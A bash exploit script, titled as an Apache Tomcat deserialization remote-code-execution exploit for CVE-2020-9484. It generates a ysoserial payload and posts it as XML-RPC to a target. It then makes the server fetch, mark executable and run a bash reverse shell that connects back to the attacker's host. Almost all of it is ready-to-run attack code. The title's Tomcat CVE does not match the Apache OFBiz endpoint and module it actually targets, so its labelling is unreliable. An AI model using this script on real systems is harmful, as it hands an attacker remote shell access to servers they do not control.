#!/bin/bash
# Exploit Title: Apache Tomcat RCE by deserialization
# Exploit Author: kashz (@iamkashz)
# Date: 05.10.2021
# CVE-ID: CVE-2020-9484
# Tested on: Tomcat v9.0.31

# This is based off https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialiation/

# target details
SCHEME="https"
TARGET_IP=""
TARGET_PORT="8443"

# START Python server at port 80.
# reverse shell details
LOCAL_IP=""
LOCAL_PORT="6969"

mkdir rce
cd rce
echo "[+] Working in $(pwd)/rce"

echo "[+] Downloading ysoserial-master.jar.."
wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-master.jar

echo "[+] Generating payload.sh"
cat <<EOF >payload.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/$LOCAL_IP/$LOCAL_PORT 0>&1'
EOF

deserialization_RCE() {
  CMD_TO_RUN=$1
  echo "[+] Executing Part 1 (.jar)"
  java -jar ysoserial-master.jar ROME "$CMD_TO_RUN" >shell-rce.jar

  echo "[+] Executing Part 2 (.xml)"
  ENCODED_PAYLOAD=$(cat shell-rce.jar | base64)
  FUN_NAME="kashz-tomcat-deserialization-rce-script"
  cat <<EOF >shell-rce.xml
<?xml version="1.0"?>
<methodCall>
  <methodName>${FUN_NAME}</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>${FUN_NAME}</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">${ENCODED_PAYLOAD}
              </serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
EOF

  echo "[+] Executing Part 3 sending .xml"
  URI="${SCHEME}://${TARGET_IP}:${TARGET_PORT}/webtools/control/xmlrpc"
  curl -s -k -X 'POST' -H 'Content-Type: text/xml' --data-binary @shell-rce.xml ${URI}
  echo ""
  echo ""
}

echo "[+] Exploiting $TARGET_IP"
sleep 1
echo ""
echo "[+] Part 1/3: download payload.sh"
deserialization_RCE "wget $LOCAL_IP/rce/payload.sh -O /tmp/kashz"
echo ""
sleep 1
echo "[+] Part 2/3: chmod payload.sh"
deserialization_RCE "chmod +x /tmp/kashz"
echo ""
sleep 1
echo "[+] Part 3/3: execute payload.sh"
deserialization_RCE "/tmp/kashz"
echo ""
sleep 1
echo "[+] Cleaning up build files"
cd ..
rm -rf rce/
echo "[+] Exit"
